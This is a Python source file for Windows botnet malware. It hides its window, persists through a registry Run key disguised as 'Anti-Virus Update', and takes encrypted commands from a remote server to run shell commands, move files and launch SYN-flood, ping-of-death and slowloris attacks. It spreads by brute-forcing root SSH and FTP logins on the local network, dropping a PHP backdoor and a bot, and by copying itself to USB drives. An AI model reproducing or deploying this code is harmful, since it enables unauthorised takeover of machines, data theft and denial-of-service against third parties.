import os
import time
import base64
import shutil
import socket
import random
import ftplib
import paramiko
import win32api
import platform
import win32con
import win32gui
import threading
import win32file
import subprocess
import win32console
from Queue import Queue
from Crypto.Cipher import XOR, AES
from Crypto.Hash import SHA256
from __assets__ import Lo0sR, Bully


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


path_to_files = "C:/Users/" + win32api.GetUserName() + "/Documents/Windows Defender/"


NUMBER_OF_THREADS = 4
JOB_NUMBER = [1, 2, 3, 4, ]
queue = Queue()

common_ports = [21, 22]
passwords = []

events = []
ddos_events = []
connected = False

net_devices = []


class Startup:
    def __init__(self):
        self.user = win32api.GetUserName()  # Username
        self.reg_exist = True

    def hide(self):
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)

    def add_to_registry(self):  # add to startup registry
        hkey = win32api.RegCreateKey(win32con.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run")
        win32api.RegSetValueEx(hkey, 'Anti-Virus Update', 0, win32con.REG_SZ, __file__)
        win32api.RegCloseKey(hkey)

    def add_to_startup(self):
        path = 'C:\\Users\\' + self.user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
        if os.path.isfile(path + __file__.split("")) == True:
            pass
        else:
            shutil.copy(__file__, path)

    def make_dirs(self):
        if not os.path.exists(path_to_files + "downloads"):
            os.mkdir(path_to_files + "downloads")

    def run(self):
        self.hide()
        self.make_dirs()
        #self.add_to_startup() # Choose startup or registry (both start on boot)
        self.add_to_registry()


class EncryptionHandler:
    def __init__(self):
        self.pswd = "\x1f\xbf\x9fV\x1c'\xe7\xbf\xddo\x1e@@\xe7l\xce\xed\xc0\x12\xd4\xed\xdbNZ!\xd9\xb3\x81|\xa4\xe7"
        self.padding = "{"

    def _key(self):
        key = SHA256.new(self.pswd)
        key = key.digest()
        return key

    def _pad(self, data):
        length = len(data)
        to_pad = 0
        while length % 16:
            to_pad += 1
            length += 1
        return data + (self.padding * to_pad)

    def _unpad(self, data):
        data = data.strip(self.padding)
        return data

    def encrypt(self, data):
        print str(data)
        cipher = AES.new(self._key(), AES.MODE_CTR, counter=lambda: self._key()[:16])
        data = self._pad(data)
        data = cipher.encrypt(data)
        cipher = XOR.new(self._key())
        data = cipher.encrypt(data)
        data =  base64.b64encode(data)
        return data

    def decrypt(self, data):
        cipher = XOR.new(self._key())
        data = base64.b64decode(data)
        data = cipher.decrypt(data)
        cipher = AES.new(self._key(), AES.MODE_CTR, counter=lambda: self._key()[:16])
        data = cipher.decrypt(data)
        data = self._unpad(data)
        return data


class DenialOfService:
    def ping_of_death(self, target):
        from scapy.all import IP, ICMP, send
        src = "%i.%i.%i.%i" % (
        random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
        ip_hdr = IP(src, target)
        _packet = ip_hdr / ICMP() / (str(os.urandom(65500)))
        send(_packet)

    def syn_flood(self, target, port):
        from scapy.all import IP, TCP, send
        i = IP()
        i.src = "%i.%i.%i.%i" % (random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
        i.dst = target
        t = TCP()
        t.sport = random.randint(1, 65500)
        t.dport = port
        t.flags = 'S'
        send(i / t, verbose=0)

    def slow_loris(self, target):
        Bully.Bully(target)


class FileHandler:
    def upload(self, filename):
        time.sleep(0.5)
        if os.path.isfile(filename):
            with open(filename, 'rb') as f:
                bytesToSend = f.read(1024)
                Bot().send(bytesToSend)
                while bytesToSend:
                    bytesToSend = f.read(1024)
                    Bot().send(bytesToSend)
        Bot().send("EOF")

    def download(self, filename):
        data = Bot().receive()
        f = open('new_' + filename, 'wb')
        f.write(data)
        while data:
            data = Bot().receive()
            if data == "EOF":
                break
            else:
                f.write(data)
        print "Download Complete!"
        f.close()


class Spread:
    def load_passwords(self):
        global passwords
        with open("__assets__/passwords.txt", "r") as f:
            for pswd in f.readlines():
                time.sleep(0.1)
                passwords.append(pswd.strip("\n"))
        return None

    def locate_usb(self):
        drive_list = []
        drivebits = win32file.GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                drname = '%c:\\' % chr(ord('A') + d)
                t = win32file.GetDriveType(drname)
                if t == win32file.DRIVE_REMOVABLE:
                    drive_list.append(drname)
        return drive_list

    def hijack_usb(self):
        while True:
            for usb in self.locate_usb():
                if usb:
                    for file in os.listdir("."):
                        shutil.copy(file, usb)
            time.sleep(120)

    def get_gateway(self):
        p = sr1(IP(dst="www.google.com", ttl=0) / ICMP() / "X", verbose=0)
        return p.src

    def scan_lan(self):
        global net_devices
        time.sleep(0.5)
        base_ip = self.get_gateway()
        base_ip = base_ip.split('.')
        base_ip = "%s.%s.%s." % (base_ip[0], base_ip[1], base_ip[2])
        for ip in range(1, 255):
            ip = str(base_ip) + str(ip)
            for port in common_ports:
                print ip
                if port == 22:
                    ThreadHandler().add_to_threads(Spread().brute_ssh, args=str(ip))
                else:
                    ThreadHandler().add_to_threads(Spread().brute_ftp, args=str(ip))
        return None

    def brute_ftp(self, host):
        global passwords
        for pswd in passwords:
            try:
                ftp = ftplib.FTP(host)
                ftp.login("root", pswd)
                ftp.storlines("STOR %s" % "index.php", open("some_infected_php_file.php", "r")) # Change to actual php backdoor (You can use Weevely to generate a backdoor)
                ftp.quit()
            except Exception:
                pass
        return None

    def brute_ssh(self, host):
        global passwords
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for pswd in passwords:
            try:
                ssh.connect(host, port=22, username="root", password=pswd)
                sftp = ssh.open_sftp()
                ssh.exec_command("cd ..")
                ssh.exec_command("mkdir .etc")
                ssh.exec_command("cd .etc")
                for file in os.listdir("SSH_files_linux"):
                    sftp.put(file, ".etc")
                sftp.close()
                ssh.exec_command("chmod +x ActualBot.py")
                ssh.exec_command("./ActualBot.py")
                ssh.close()
            except paramiko.AuthenticationException:
                pass
            except socket.error:
                pass
        return None

    def run(self):
        ThreadHandler().add_to_threads(target=self.load_passwords, args=None)
        ThreadHandler().add_to_threads(target=self.scan_lan, args=None)
        ThreadHandler().add_to_threads(target=self.hijack_usb, args=None)



class Bot:
    def __init__(self):
        self.ip = ''  # IP of Host that the server is running on
        self.port = 44353  # Host's port

    def connect(self):
        global connected
        while connected == False:
            time.sleep(1)
            try:
                s.connect((self.ip, self.port))
            except socket.error:
                pass
            finally:
                connected = True

    def send(self, data):
        global connected
        data = EncryptionHandler().encrypt(data)
        try:
            s.send(str(data))
        except socket.error as e:
            print e
            time.sleep(2.5)
            connected = False

    def receive(self):
        global s
        global connected
        try:
            data = s.recv(1368)
            if data:
                return EncryptionHandler().decrypt(data)
            if not data:
                s = socket.socket()
                if connected != False:
                    connected = False
                    self.connect()
        except socket.error as e:
            print e
            s = socket.socket()
            if connected != False:
                connected = False
                self.connect()

    def exec_command(self, command):
        command = command.split(' ')
        if command[0] == 'cd':
            os.chdir(command[1])
            self.send(os.getcwd())
        elif command[0] == 'info':
            info = platform.uname()
            self.send('OS: %s\nHost Name: %s' % (info[0], info[1]))
        elif command[0] == 'exit':
            s.close()
            self.connect()
        elif command[0] == ('start' or 'Start'):
            data = ' '.join(command)
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        elif command[0] == "upload":
            FileHandler().download(command[1])
        elif command[0] == "download":
            FileHandler().upload(command[1])
        elif command[0] == 'DDoS':
            if command[1]:
                if command[2]:
                    if command[1] == 'pod':
                        thread_id = ThreadHandler().add_to_threads(DenialOfService().ping_of_death, command[2])
                        ddos_events.append(thread_id)
                        self.send('Started DoS!')
                    if command[1] == "sl":
                        thread_id = ThreadHandler().add_to_threads(DenialOfService().slow_loris, command[2])
                        ddos_events.append(thread_id)
                        self.send('Started DoS!')
                    if command[1] == "syn":
                        thread_id = ThreadHandler().add_to_threads(DenialOfService().syn_flood, command[2])
                        ddos_events.append(thread_id)
                        self.send('Started DoS!')
                    if command[1] == 'stop':
                        ThreadHandler().stop(ddos_events[0])
                        self.send('Stopped DoS!')
                else:
                    self.send("[!]You need to specify a target!")
            else:
                self.send("[!]You need to specify an attack type!")
        else:
            data = ' '.join(command)
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = cmd.stdout.read() + cmd.stderr.read()
            if len(output) > 65520:
                self.send("[!]Too large!")
            else:
                self.send(output)

    def handler(self):
        while True:
            data = self.receive()
            if data:
                data.split(' ')
                if data[0] == 'ok?':
                    self.send('ok!')
                if data[0] == 'download':
                    print data[1]
                    if len(data[1]) > 0:
                        FileHandler().upload(data[1])
                if data[0] == 'upload':
                    print data[1]
                    if len(data[1]) > 0:
                        FileHandler().download(data[1])
                else:
                    self.exec_command(data)

    def run(self):
        self.connect()
        self.handler()


class ThreadHandler:
    def stop(self, event_id):
        event = events[event_id]
        event.set()

    def add_to_threads(self, target, args):
        global events
        event = threading.Event()
        events.append(event)
        if args:
            t = threading.Thread(target=target, args=args)
            t.daemon = True
            t.start()
        else:
            t = threading.Thread(target=target)
            t.daemon = True
            t.start()
        thread_id = events.index(event)
        return thread_id

    def create_workers(self):
        for _ in range(NUMBER_OF_THREADS):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    def work(self):
        while True:
            x = queue.get()
            if x == 1:
                Startup().run()
            if x == 2:
                Bot().run()
            if x == 3:
                Spread().run()
            if x == 4:
                Lo0sR.ThreadHandler().run()
            queue.task_done()

    def create_jobs(self):
        for x in JOB_NUMBER:
            queue.put(x)
        queue.join()

    def run(self):
        self.create_workers()
        self.create_jobs()


if __name__ == '__main__':
    ThreadHandler().run()
